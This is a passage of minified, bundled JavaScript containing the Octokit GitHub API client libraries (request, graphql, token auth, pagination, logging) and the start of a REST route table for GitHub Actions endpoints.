import{createRequire as hw}from"node:module";var vw=Object.create;var{getPrototypeOf:xw,defineProperty:JY,getOwnPropertyNames:fw}=Object;var gw=Object.prototype.hasOwnProperty;var z9=(X,J,Q)=>{Q=X!=null?vw(xw(X)):{};let Y=J||!X||!X.__esModule?JY(Q,"default",{value:X,enumerable:!0}):Q;for(let W of fw(X))if(!gw.call(Y,W))JY(Y,W,{get:()=>X[W],enumerable:!0});return Y};var c=(X,J)=>()=>(J||X((J={exports:{}}).exports,J),J.exports);var Y9=(X,J)=>{for(var Q in J)JY(X,Q,{get:J[Q],enumerable:!0,configurable:!0,set:(Y)=>J[Q]=()=>Y})};var j1=(X,J)=>()=>(X&&(J=X(X=0)),J);var m0=hw(import.meta.url);class nQ{minLevel;defaultOptions;constructor(X={}){this.minLevel=process.env.LOG_LEVEL?.toLowerCase()||"info",this.defaultOptions={timestamp:!0,...X}}debug(X,J){this.log("debug",X,J)}info(X,J){this.log("info",X,J)}warn(X,J){this.log("warn",X,J)}error(X,J){let Q;if(J)Q={error:J instanceof Error?{message:J.message,stack:J.stack}:J};this.log("error",X,Q)}log(X,J,Q){if(!this.shouldLog(X))return;let Y=this.formatLogEntry(X,J,Q);switch(X){case"debug":console.debug(Y);break;case"info":console.info(Y);break;case"warn":console.warn(Y);break;case"error":console.error(Y);break}}shouldLog(X){let J=["debug","info","warn","error"],Q=J.indexOf(this.minLevel);return J.indexOf(X)>=Q}formatLogEntry(X,J,Q){let Y=this.defaultOptions.timestamp?`[${new Date().toISOString()}]`:"",W=`[${X.toUpperCase()}]`,z=`${Y}${W} ${J}`;if(Q)try{let G=JSON.stringify(Q,null,2);z+=`
${G}`}catch(G){z+=`
[Error serializing metadata]`}return z}setMinLevel(X){this.minLevel=X}getMinLevel(){return this.minLevel}}var q;var t1=j1(()=>{q=new nQ});function l6(){if(typeof navigator==="object"&&"userAgent"in navigator)return navigator.userAgent;if(typeof process==="object"&&process.version!==void 0)return`Node.js/${process.version.substr(1)} (${process.platform}; ${process.arch})`;return"<environment undetectable>"}function sQ(X,J,Q,Y){if(typeof Q!=="function")throw new Error("method for before hook must be a function");if(!Y)Y={};if(Array.isArray(J))return J.reverse().reduce((W,z)=>{return sQ.bind(null,X,z,W,Y)},Q)();return Promise.resolve().then(()=>{if(!X.registry[J])return Q(Y);return X.registry[J].reduce((W,z)=>{return z.hook.bind(null,W,Y)},Q)()})}function $U(X,J,Q,Y){let W=Y;if(!X.registry[Q])X.registry[Q]=[];if(J==="before")Y=(z,G)=>{return Promise.resolve().then(W.bind(null,G)).then(z.bind(null,G))};if(J==="after")Y=(z,G)=>{let H;return Promise.resolve().then(z.bind(null,G)).then((U)=>{return H=U,W(H,G)}).then(()=>{return H})};if(J==="error")Y=(z,G)=>{return Promise.resolve().then(z.bind(null,G)).catch((H)=>{return W(H,G)})};X.registry[Q].push({hook:Y,orig:W})}function kU(X,J,Q){if(!X.registry[J])return;let Y=X.registry[J].map((W)=>{return W.orig}).indexOf(Q);if(Y===-1)return;X.registry[J].splice(Y,1)}function xU(X,J,Q){let Y=vU(kU,null).apply(null,Q?[J,Q]:[J]);X.api={remove:Y},X.remove=Y,["before","error","after","wrap"].forEach((W)=>{let z=Q?[J,W,Q]:[J,W];X[W]=X.api[W]=vU($U,null).apply(null,z)})}function TS(){let X=Symbol("Singular"),J={registry:{}},Q=sQ.bind(null,J,X);return xU(Q,J,X),Q}function _S(){let X={registry:{}},J=sQ.bind(null,X);return xU(J,X),J}var bU,vU,fU;var gU=j1(()=>{bU=Function.bind,vU=bU.bind(bU);fU={Singular:TS,Collection:_S}});function bS(X){if(!X)return{};return Object.keys(X).reduce((J,Q)=>{return J[Q.toLowerCase()]=X[Q],J},{})}function vS(X){if(typeof X!=="object"||X===null)return!1;if(Object.prototype.toString.call(X)!=="[object Object]")return!1;let J=Object.getPrototypeOf(X);if(J===null)return!0;let Q=Object.prototype.hasOwnProperty.call(J,"constructor")&&J.constructor;return typeof Q==="function"&&Q instanceof Q&&Function.prototype.call(Q)===Function.prototype.call(X)}function mU(X,J){let Q=Object.assign({},X);return Object.keys(J).forEach((Y)=>{if(vS(J[Y]))if(!(Y in X))Object.assign(Q,{[Y]:J[Y]});else Q[Y]=mU(X[Y],J[Y]);else Object.assign(Q,{[Y]:J[Y]})}),Q}function hU(X){for(let J in X)if(X[J]===void 0)delete X[J];return X}function AY(X,J,Q){if(typeof J==="string"){let[W,z]=J.split(" ");Q=Object.assign(z?{method:W,url:z}:{url:W},Q)}else Q=Object.assign({},J);Q.headers=bS(Q.headers),hU(Q),hU(Q.headers);let Y=mU(X||{},Q);if(Q.url==="/graphql"){if(X&&X.mediaType.previews?.length)Y.mediaType.previews=X.mediaType.previews.filter((W)=>!Y.mediaType.previews.includes(W)).concat(Y.mediaType.previews);Y.mediaType.previews=(Y.mediaType.previews||[]).map((W)=>W.replace(/-preview/,""))}return Y}function xS(X,J){let Q=/\?/.test(X)?"&":"?",Y=Object.keys(J);if(Y.length===0)return X;return X+Q+Y.map((W)=>{if(W==="q")return"q="+J.q.split("+").map(encodeURIComponent).join("+");return`${W}=${encodeURIComponent(J[W])}`}).join("&")}function gS(X){return X.replace(/(?:^\W+)|(?:(?<!\W)\W+$)/g,"").split(/,/)}function hS(X){let J=X.match(fS);if(!J)return[];return J.map(gS).reduce((Q,Y)=>Q.concat(Y),[])}function yU(X,J){let Q={__proto__:null};for(let Y of Object.keys(X))if(J.indexOf(Y)===-1)Q[Y]=X[Y];return Q}function uU(X){return X.split(/(%[0-9A-Fa-f]{2})/g).map(function(J){if(!/%[0-9A-Fa-f]/.test(J))J=encodeURI(J).replace(/%5B/g,"[").replace(/%5D/g,"]");return J}).join("")}function $J(X){return encodeURIComponent(X).replace(/[!'()*]/g,function(J){return"%"+J.charCodeAt(0).toString(16).toUpperCase()})}function z5(X,J,Q){if(J=X==="+"||X==="#"?uU(J):$J(J),Q)return $J(Q)+"="+J;else return J}function EJ(X){return X!==void 0&&X!==null}function RY(X){return X===";"||X==="&"||X==="?"}function yS(X,J,Q,Y){var W=X[Q],z=[];if(EJ(W)&&W!=="")if(typeof W==="string"||typeof W==="number"||typeof W==="boolean"){if(W=W.toString(),Y&&Y!=="*")W=W.substring(0,parseInt(Y,10));z.push(z5(J,W,RY(J)?Q:""))}else if(Y==="*")if(Array.isArray(W))W.filter(EJ).forEach(function(G){z.push(z5(J,G,RY(J)?Q:""))});else Object.keys(W).forEach(function(G){if(EJ(W[G]))z.push(z5(J,W[G],G))});else{let G=[];if(Array.isArray(W))W.filter(EJ).forEach(function(H){G.push(z5(J,H))});else Object.keys(W).forEach(function(H){if(EJ(W[H]))G.push($J(H)),G.push(z5(J,W[H].toString()))});if(RY(J))z.push($J(Q)+"="+G.join(","));else if(G.length!==0)z.push(G.join(","))}else if(J===";"){if(EJ(W))z.push($J(Q))}else if(W===""&&(J==="&"||J==="?"))z.push($J(Q)+"=");else if(W==="")z.push("");return z}function mS(X){return{expand:uS.bind(null,X)}}function uS(X,J){var Q=["+","#",".","/",";","?","&"];if(X=X.replace(/\{([^\{\}]+)\}|([^\{\}]+)/g,function(Y,W,z){if(W){let H="",U=[];if(Q.indexOf(W.charAt(0))!==-1)H=W.charAt(0),W=W.substr(1);if(W.split(/,/g).forEach(function(K){var V=/([^:\*]*)(?::(\d+)|(\*))?/.exec(K);U.push(yS(J,H,V[1],V[2]||V[3]))}),H&&H!=="+"){var G=",";if(H==="?")G="&";else if(H!=="#")G=H;return(U.length!==0?H:"")+U.join(G)}else return U.join(",")}else return uU(z)}),X==="/")return X;else return X.replace(/\/$/,"")}function cU(X){let J=X.method.toUpperCase(),Q=(X.url||"/").replace(/:([a-z]\w+)/g,"{$1}"),Y=Object.assign({},X.headers),W,z=yU(X,["method","baseUrl","url","headers","request","mediaType"]),G=hS(Q);if(Q=mS(Q).expand(z),!/^http/.test(Q))Q=X.baseUrl+Q;let H=Object.keys(X).filter((V)=>G.includes(V)).concat("baseUrl"),U=yU(z,H);if(!/application\/octet-stream/i.test(Y.accept)){if(X.mediaType.format)Y.accept=Y.accept.split(/,/).map((V)=>V.replace(/application\/vnd(\.\w+)(\.v3)?(\.\w+)?(\+json)?$/,`application/vnd$1$2.${X.mediaType.format}`)).join(",");if(Q.endsWith("/graphql")){if(X.mediaType.previews?.length){let V=Y.accept.match(/(?<![\w-])[\w-]+(?=-preview)/g)||[];Y.accept=V.concat(X.mediaType.previews).map((B)=>{let Z=X.mediaType.format?`.${X.mediaType.format}`:"+json";return`application/vnd.github.${B}-preview${Z}`}).join(",")}}}if(["GET","HEAD"].includes(J))Q=xS(Q,U);else if("data"in U)W=U.data;else if(Object.keys(U).length)W=U;if(!Y["content-type"]&&typeof W!=="undefined")Y["content-type"]="application/json; charset=utf-8";if(["PATCH","PUT"].includes(J)&&typeof W==="undefined")W="";return Object.assign({method:J,url:Q,headers:Y},typeof W!=="undefined"?{body:W}:null,X.request?{request:X.request}:null)}function cS(X,J,Q){return cU(AY(X,J,Q))}function lU(X,J){let Q=AY(X,J),Y=cS.bind(null,Q);return Object.assign(Y,{DEFAULTS:Q,defaults:lU.bind(null,Q),merge:AY.bind(null,Q),parse:cU})}var ES="0.0.0-development",$S,kS,fS,pU;var dU=j1(()=>{$S=`octokit-endpoint.js/${ES} ${l6()}`,kS={method:"GET",baseUrl:"https://api.github.com",headers:{accept:"application/vnd.github.v3+json","user-agent":$S},mediaType:{format:""}};fS=/\{[^{}}]+\}/g;pU=lU(null,kS)});function pS(X){if(typeof X!=="string")return kJ;let J=X.indexOf(";"),Q=J!==-1?X.slice(0,J).trim():X.trim();if(lS.test(Q)===!1)return kJ;let Y={type:Q.toLowerCase(),parameters:new NY};if(J===-1)return Y;let W,z,G;iU.lastIndex=J;while(z=iU.exec(X)){if(z.index!==J)return kJ;if(J+=z[0].length,W=z[1].toLowerCase(),G=z[2],G[0]==='"')G=G.slice(1,G.length-1),rU.test(G)&&(G=G.replace(rU,"$1"));Y.parameters[W]=G}if(J!==X.length)return kJ;return Y}var NY=function X(){},iU,rU,lS,kJ,LY;var nU=j1(()=>{NY.prototype=Object.create(null);iU=/; *([!#$%&'*+.^\w`|~-]+)=("(?:[\v\u0020\u0021\u0023-\u005b\u005d-\u007e\u0080-\u00ff]|\\[\v\u0020-\u00ff])*"|[!#$%&'*+.^\w`|~-]+) */gu,rU=/\\([\v\u0020-\u00ff])/gu,lS=/^[!#$%&'*+.^\w|~-]+\/[!#$%&'*+.^\w|~-]+$/u,kJ={type:"",parameters:new NY};Object.freeze(kJ.parameters);Object.freeze(kJ);LY=pS});var bJ;var aU=j1(()=>{bJ=class bJ extends Error{name;status;request;response;constructor(X,J,Q){super(X);if(this.name="HttpError",this.status=Number.parseInt(J),Number.isNaN(this.status))this.status=0;if("response"in Q)this.response=Q.response;let Y=Object.assign({},Q.request);if(Q.request.headers.authorization)Y.headers=Object.assign({},Q.request.headers,{authorization:Q.request.headers.authorization.replace(/(?<! ) .*$/," [REDACTED]")});Y.url=Y.url.replace(/\bclient_secret=\w+/g,"client_secret=[REDACTED]").replace(/\baccess_token=\w+/g,"access_token=[REDACTED]"),this.request=Y}}});function nS(X){if(typeof X!=="object"||X===null)return!1;if(Object.prototype.toString.call(X)!=="[object Object]")return!1;let J=Object.getPrototypeOf(X);if(J===null)return!0;let Q=Object.prototype.hasOwnProperty.call(J,"constructor")&&J.constructor;return typeof Q==="function"&&Q instanceof Q&&Function.prototype.call(Q)===Function.prototype.call(X)}async function sU(X){let J=X.request?.fetch||globalThis.fetch;if(!J)throw new Error("fetch is not set. Please pass a fetch implementation as new Octokit({ request: { fetch }}). Learn more at https://github.com/octokit/octokit.js/#fetch-missing");let Q=X.request?.log||console,Y=X.request?.parseSuccessResponseBody!==!1,W=nS(X.body)||Array.isArray(X.body)?JSON.stringify(X.body):X.body,z=Object.fromEntries(Object.entries(X.headers).map(([B,Z])=>[B,String(Z)])),G;try{G=await J(X.url,{method:X.method,body:W,redirect:X.request?.redirect,headers:z,signal:X.request?.signal,...X.body&&{duplex:"half"}})}catch(B){let Z="Unknown Error";if(B instanceof Error){if(B.name==="AbortError")throw B.status=500,B;if(Z=B.message,B.name==="TypeError"&&"cause"in B){if(B.cause instanceof Error)Z=B.cause.message;else if(typeof B.cause==="string")Z=B.cause}}let M=new bJ(Z,500,{request:X});throw M.cause=B,M}let{status:H,url:U}=G,K={};for(let[B,Z]of G.headers)K[B]=Z;let V={url:U,status:H,headers:K,data:""};if("deprecation"in K){let B=K.link&&K.link.match(/<([^<>]+)>; rel="deprecation"/),Z=B&&B.pop();Q.warn(`[@octokit/request] "${X.method} ${X.url}" is deprecated. It is scheduled to be removed on ${K.sunset}${Z?`. See ${Z}`:""}`)}if(H===204||H===205)return V;if(X.method==="HEAD"){if(H<400)return V;throw new bJ(G.statusText,H,{response:V,request:X})}if(H===304)throw V.data=await DY(G),new bJ("Not modified",H,{response:V,request:X});if(H>=400)throw V.data=await DY(G),new bJ(sS(V.data),H,{response:V,request:X});return V.data=Y?await DY(G):G.body,V}async function DY(X){let J=X.headers.get("content-type");if(!J)return X.text().catch(()=>"");let Q=LY(J);if(aS(Q)){let Y="";try{return Y=await X.text(),JSON.parse(Y)}catch(W){return Y}}else if(Q.type.startsWith("text/")||Q.parameters.charset?.toLowerCase()==="utf-8")return X.text().catch(()=>"");else return X.arrayBuffer().catch(()=>new ArrayBuffer(0))}function aS(X){return X.type==="application/json"||X.type==="application/scim+json"}function sS(X){if(typeof X==="string")return X;if(X instanceof ArrayBuffer)return"Unknown error";if("message"in X){let J="documentation_url"in X?` - ${X.documentation_url}`:"";return Array.isArray(X.errors)?`${X.message}: ${X.errors.map((Q)=>JSON.stringify(Q)).join(", ")}${J}`:`${X.message}${J}`}return`Unknown error: ${JSON.stringify(X)}`}function wY(X,J){let Q=X.defaults(J);return Object.assign(function(W,z){let G=Q.merge(W,z);if(!G.request||!G.request.hook)return sU(Q.parse(G));let H=(U,K)=>{return sU(Q.parse(Q.merge(U,K)))};return Object.assign(H,{endpoint:Q,defaults:wY.bind(null,Q)}),G.request.hook(H,G)},{endpoint:Q,defaults:wY.bind(null,Q)})}var iS="9.2.4",rS,H5;var IY=j1(()=>{dU();nU();aU();rS={headers:{"user-agent":`octokit-request.js/${iS} ${l6()}`}};H5=wY(pU,rS)});function tS(X){return`Request failed due to following response errors:
`+X.errors.map((J)=>` - ${J.message}`).join(`
`)}function QT(X,J,Q){if(Q){if(typeof J==="string"&&"query"in Q)return Promise.reject(new Error('[@octokit/graphql] "query" cannot be used as variable name'));for(let G in Q){if(!JT.includes(G))continue;return Promise.reject(new Error(`[@octokit/graphql] "${G}" cannot be used as variable name`))}}let Y=typeof J==="string"?Object.assign({query:J},Q):J,W=Object.keys(Y).reduce((G,H)=>{if(XT.includes(H))return G[H]=Y[H],G;if(!G.variables)G.variables={};return G.variables[H]=Y[H],G},{}),z=Y.baseUrl||X.endpoint.DEFAULTS.baseUrl;if(oU.test(z))W.url=z.replace(oU,"/api/graphql");return X(W).then((G)=>{if(G.data.errors){let H={};for(let U of Object.keys(G.headers))H[U]=G.headers[U];throw new eS(W,H,G.data)}return G.data.data})}function CY(X,J){let Q=X.defaults(J);return Object.assign((W,z)=>{return QT(Q,W,z)},{defaults:CY.bind(null,Q),endpoint:Q.endpoint})}function tU(X){return CY(X,{method:"POST",url:"/graphql"})}var oS="0.0.0-development",eS,XT,JT,oU,Ml1;var eU=j1(()=>{IY();eS=class extends Error{constructor(X,J,Q){super(tS(Q));if(this.request=X,this.headers=J,this.response=Q,this.errors=Q.errors,this.data=Q.data,Error.captureStackTrace)Error.captureStackTrace(this,this.constructor)}name="GraphqlResponseError";errors;data},XT=["method","baseUrl","url","headers","request","query","mediaType","operationName"],JT=["query","method","url"],oU=/\/api\/v3\/?$/;Ml1=CY(H5,{headers:{"user-agent":`octokit-graphql.js/${oS} ${l6()}`},method:"POST",url:"/graphql"})});async function WT(X){let J=YT(X),Q=X.startsWith("v1.")||X.startsWith("ghs_"),Y=X.startsWith("ghu_");return{type:"token",token:X,tokenType:J?"app":Q?"installation":Y?"user-to-server":"oauth"}}function GT(X){if(X.split(/\./).length===3)return`bearer ${X}`;return`token ${X}`}async function zT(X,J,Q,Y){let W=J.endpoint.merge(Q,Y);return W.headers.authorization=GT(X),J(W)}var PY="(?:[a-zA-Z0-9_-]+)",XK="\\.",JK,YT,QK=function X(J){if(!J)throw new Error("[@octokit/auth-token] No token passed to createTokenAuth");if(typeof J!=="string")throw new Error("[@octokit/auth-token] Token passed to createTokenAuth is not a string");return J=J.replace(/^(token|bearer) +/i,""),Object.assign(WT.bind(null,J),{hook:zT.bind(null,J)})};var YK=j1(()=>{JK=new RegExp(`^${PY}${XK}${PY}${XK}${PY}$`),YT=JK.test.bind(JK)});var SY="6.1.6";var WK=()=>{};function KT(X={}){if(typeof X.debug!=="function")X.debug=GK;if(typeof X.info!=="function")X.info=GK;if(typeof X.warn!=="function")X.warn=HT;if(typeof X.error!=="function")X.error=UT;return X}var GK=()=>{},HT,UT,zK,TY;var HK=j1(()=>{gU();IY();eU();YK();WK();HT=console.warn.bind(console),UT=console.error.bind(console);zK=`octokit-core.js/${SY} ${l6()}`;TY=class TY{static VERSION=SY;static defaults(X){return class extends this{constructor(...Q){let Y=Q[0]||{};if(typeof X==="function"){super(X(Y));return}super(Object.assign({},X,Y,Y.userAgent&&X.userAgent?{userAgent:`${Y.userAgent} ${X.userAgent}`}:null))}}}static plugins=[];static plugin(...X){let J=this.plugins;return class extends this{static plugins=J.concat(X.filter((Y)=>!J.includes(Y)))}}constructor(X={}){let J=new fU.Collection,Q={baseUrl:H5.endpoint.DEFAULTS.baseUrl,headers:{},request:Object.assign({},X.request,{hook:J.bind(null,"request")}),mediaType:{previews:[],format:""}};if(Q.headers["user-agent"]=X.userAgent?`${X.userAgent} ${zK}`:zK,X.baseUrl)Q.baseUrl=X.baseUrl;if(X.previews)Q.mediaType.previews=X.previews;if(X.timeZone)Q.headers["time-zone"]=X.timeZone;if(this.request=H5.defaults(Q),this.graphql=tU(this.request).defaults(Q),this.log=KT(X.log),this.hook=J,!X.authStrategy)if(!X.auth)this.auth=async()=>({type:"unauthenticated"});else{let W=QK(X.auth);J.wrap("request",W.hook),this.auth=W}else{let{authStrategy:W,...z}=X,G=W(Object.assign({request:this.request,log:this.log,octokit:this,octokitOptions:z},X.auth));J.wrap("request",G.hook),this.auth=G}let Y=this.constructor;for(let W=0;W<Y.plugins.length;++W)Object.assign(this,Y.plugins[W](this,X))}request;graphql;log;hook;auth}});var UK="5.3.1";var KK=()=>{};function _Y(X){X.hook.wrap("request",(J,Q)=>{X.log.debug("request",Q);let Y=Date.now(),W=X.request.endpoint.parse(Q),z=W.url.replace(Q.baseUrl,"");return J(Q).then((G)=>{let H=G.headers["x-github-request-id"];return X.log.info(`${W.method} ${z} - ${G.status} with id ${H} in ${Date.now()-Y}ms`),G}).catch((G)=>{let H=G.response?.headers["x-github-request-id"]||"UNKNOWN";throw X.log.error(`${W.method} ${z} - ${G.status} with id ${H} in ${Date.now()-Y}ms`),G})})}var VK=j1(()=>{KK();_Y.VERSION=UK});function BT(X){if(!X.data)return{...X,data:[]};if(!(("total_count"in X.data)&&!("url"in X.data)))return X;let Q=X.data.incomplete_results,Y=X.data.repository_selection,W=X.data.total_count;delete X.data.incomplete_results,delete X.data.repository_selection,delete X.data.total_count;let z=Object.keys(X.data)[0],G=X.data[z];if(X.data=G,typeof Q!=="undefined")X.data.incomplete_results=Q;if(typeof Y!=="undefined")X.data.repository_selection=Y;return X.data.total_count=W,X}function EY(X,J,Q){let Y=typeof J==="function"?J.endpoint(Q):X.request.endpoint(J,Q),W=typeof J==="function"?J:X.request,z=Y.method,G=Y.headers,H=Y.url;return{[Symbol.asyncIterator]:()=>({async next(){if(!H)return{done:!0};try{let U=await W({method:z,url:H,headers:G}),K=BT(U);return H=((K.headers.link||"").match(/<([^<>]+)>;\s*rel="next"/)||[])[1],{value:K}}catch(U){if(U.status!==409)throw U;return H="",{value:{status:200,headers:{},data:[]}}}}})}}function BK(X,J,Q,Y){if(typeof Q==="function")Y=Q,Q=void 0;return qK(X,[],EY(X,J,Q)[Symbol.asyncIterator](),Y)}function qK(X,J,Q,Y){return Q.next().then((W)=>{if(W.done)return J;let z=!1;function G(){z=!0}if(J=J.concat(Y?Y(W.value,G):W.value.data),z)return J;return qK(X,J,Q,Y)})}function $Y(X){return{paginate:Object.assign(BK.bind(null,X),{iterator:EY.bind(null,X)})}}var VT="0.0.0-development",$l1;var ZK=j1(()=>{$l1=Object.assign(BK,{iterator:EY});$Y.VERSION=VT});var kY="13.5.0";var MK=()=>{};var qT,FK;var jK=j1(()=>{qT={actions:{addCustomLabelsToSelfHostedRunnerForOrg:["POST /orgs/{org}/actions/runners/{runner_id}/labels"],addCustomLabelsToSelfHostedRunnerForRepo:["POST /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],addRepoAccessToSelfHostedRunnerGroupInOrg:["PUT /orgs/{org}/actions/runner-groups/{runner_group_id}/repositories/{repository_id}"],addSelectedRepoToOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}/repositories/{repository_id}"],addSelectedRepoToOrgVariable:["PUT /orgs/{org}/actions/variables/{name}/repositories/{repository_id}"],approveWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/approve"],cancelWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/cancel"],createEnvironmentVariable:["POST /repos/{owner}/{repo}/environments/{environment_name}/variables"],createHostedRunnerForOrg:["POST /orgs/{org}/actions/hosted-runners"],createOrUpdateEnvironmentSecret:["PUT /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],createOrUpdateOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/actions/secrets/{secret_name}"],createOrgVariable:["POST /orgs/{org}/actions/variables"],createRegistrationTokenForOrg:["POST /orgs/{org}/actions/runners/registration-token"],createRegistrationTokenForRepo:["POST /repos/{owner}/{repo}/actions/runners/registration-token"],createRemoveTokenForOrg:["POST /orgs/{org}/actions/runners/remove-token"],createRemoveTokenForRepo:["POST /repos/{owner}/{repo}/actions/runners/remove-token"],createRepoVariable:["POST /repos/{owner}/{repo}/actions/variables"],createWorkflowDispatch:["POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches"],deleteActionsCacheById:["DELETE /repos/{owner}/{repo}/actions/caches/{cache_id}"],deleteActionsCacheByKey:["DELETE /repos/{owner}/{repo}/actions/caches{?key,ref}"],deleteArtifact:["DELETE /repos/{owner}/{repo}/actions/artifacts/{artifact_id}"],deleteEnvironmentSecret:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],deleteEnvironmentVariable:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],deleteHostedRunnerForOrg:["DELETE /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],deleteOrgSecret:["DELETE /orgs/{org}/actions/secrets/{secret_name}"],deleteOrgVariable:["DELETE /orgs/{org}/actions/variables/{name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/actions/secrets/{secret_name}"],deleteRepoVariable:["DELETE /repos/{owner}/{repo}/actions/variables/{name}"],deleteSelfHostedRunnerFromOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}"],deleteSelfHostedRunnerFromRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}"],deleteWorkflowRun:["DELETE /repos/{owner}/{repo}/actions/runs/{run_id}"],deleteWorkflowRunLogs:["DELETE /repos/{owner}/{repo}/actions/runs/{run_id}/logs"],disableSelectedRepositoryGithubActionsOrganization:["DELETE /orgs/{org}/actions/permissions/repositories/{repository_id}"],disableWorkflow:["PUT /repos/{owner}/{repo}/actions/workflows/{workflow_id}/disable"],downloadArtifact:["GET /repos/{owner}/{repo}/actions/artifacts/{artifact_id}/{archive_format}"],downloadJobLogsForWorkflowRun:["GET /repos/{owner}/{repo}/actions/jobs/{job_id}/logs"],downloadWorkflowRunAttemptLogs:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}/logs"],downloadWorkflowRunLogs:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs"],enableSelectedRepositoryGithubActionsOrganization:["PUT /orgs/{org}/actions/permissions/repositories/{repository_id}"],enableWorkflow:["PUT /repos/{owner}/{repo}/actions/workflows/{workflow_id}/enable"],forceCancelWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/force-cancel"],generateRunnerJitconfigForOrg:["POST /orgs/{org}/actions/runners/generate-jitconfig"],generateRunnerJitconfigForRepo:["POST /repos/{owner}/{repo}/actions/runners/generate-jitconfig"],getActionsCacheList:["GET /repos/{owner}/{repo}/actions/caches"],getActionsCacheUsage:["GET /repos/{owner}/{repo}/actions/cache/usage"],getActionsCacheUsageByRepoForOrg:["GET /orgs/{org}/actions/cache/usage-by-repository"],getActionsCacheUsageForOrg:["GET /orgs/{org}/actions/cache/usage"],getAllowedActionsOrganization:["GET /orgs/{org}/actions/permissions/selected-actions"],getAllowedActionsRepository:["GET /repos/{owner}/{repo}/actions/permissions/selected-actions"],getArtifact:["GET /repos/{owner}/{repo}/actions/artifacts/{artifact_id}"],getCustomOidcSubClaimForRepo:["GET /repos/{owner}/{repo}/actions/oidc/customization/sub"],getEnvironmentPublicKey:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets/public-key"],getEnvironmentSecret:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],getEnvironmentVariable:["GET /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],getGithubActionsDefaultWorkflowPermissionsOrganization:["GET /orgs/{org}/actions/permissions/workflow"],getGithubActionsDefaultWorkflowPermissionsRepository:["GET /repos/{owner}/{repo}/actions/permissions/workflow"],getGithubActionsPermissionsOrganization:["GET /orgs/{org}/actions/permissions"],getGithubActionsPermissionsRepository:["GET /repos/{owner}/{repo}/actions/permissions"],getHostedRunnerForOrg:["GET /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],getHostedRunnersGithubOwnedImagesForOrg:["GET /orgs/{org}/actions/hosted-runners/images/github-owned"],getHostedRunnersLimitsForOrg:["GET /orgs/{org}/actions/hosted-runners/limits"],getHostedRunnersMachineSpecsForOrg:["GET /orgs/{org}/actions/hosted-runners/machine-sizes"],getHostedRunnersPartnerImagesForOrg:["GET /orgs/{org}/actions/hosted-runners/images/partner"],getHostedRunnersPlatformsForOrg:["GET /orgs/{org}/actions/hosted-runners/platforms"],getJobForWorkflowRun:["GET /repos/{owner}/{repo}/actions/jobs/{job_id}"],getOrgPublicKey:["GET /orgs/{org}/actions/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/actions/secrets/{secret_name}"],getOrgVariable:["GET /orgs/{org}/actions/variables/{name}"],getPendingDeploymentsForRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/pending_deployments"],getRepoPermissions:["GET /repos/{owner}/{repo}/actions/permissions",{},{renamed:["actions","getGithubActionsPermissionsRepository"]}],getRepoPublicKey:["GET /repos/{owner}/{repo}/actions/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/actions/secrets/{secret_name}"],getRepoVariable:["GET /repos/{owner}/{repo}/actions/variables/{name}"],getReviewsForRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/approvals"],getSelfHostedRunnerForOrg:["GET /orgs/{org}/actions/runners/{runner_id}"],getSelfHostedRunnerForRepo:["GET /repos/{owner}/{repo}/actions/runners/{runner_id}"],getWorkflow:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}"],getWorkflowAccessToRepository:["GET /repos/{owner}/{repo}/actions/permissions/access"],getWorkflowRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}"],getWorkflowRunAttempt:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}"],getWorkflowRunUsage:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/timing"],getWorkflowUsage:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/timing"],listArtifactsForRepo:["GET /repos/{owner}/{repo}/actions/artifacts"],listEnvironmentSecrets:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets"],listEnvironmentVariables:["GET /repos/{owner}/{repo}/environments/{environment_name}/variables"],listGithubHostedRunnersInGroupForOrg:["GET /orgs/{org}/actions/runner-groups/{runner_group_id}/hosted-runners"],listHostedRunnersForOrg:["GET /orgs/{org}/actions/hosted-runners"],listJobsForWorkflowRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs"],listJobsForWorkflowRunAttempt:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}/jobs"],listLabelsForSelfHostedRunnerForOrg:["GET /orgs/{org}/actions/runners/{runner_id}/labels"],listLabelsForSelfHostedRunnerForRepo:["GET /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],listOrgSecrets:["GET /orgs/{org}/actions/secrets"],listOrgVariables:["GET /orgs/{org}/actions/variables"],listRepoOrganizationSecrets:["GET /repos/{owner}/{repo}/actions/organization-secrets"],listRepoOrganizationVariables:["GET /repos/{owner}/{repo}/actions/organization-variables"],listRepoSecrets:["GET /repos/{owner}/{repo}/actions/secrets"],listRepoVariables:["GET /repos/{owner}/{repo}/actions/variables"],listRepoWorkflows:["GET /repos/{owner}/{repo}/actions/workflows"],listRunnerApplicationsForOrg:["GET /orgs/{org}/actions/runners/downloads"],listRunnerApplicationsForRepo:["GET 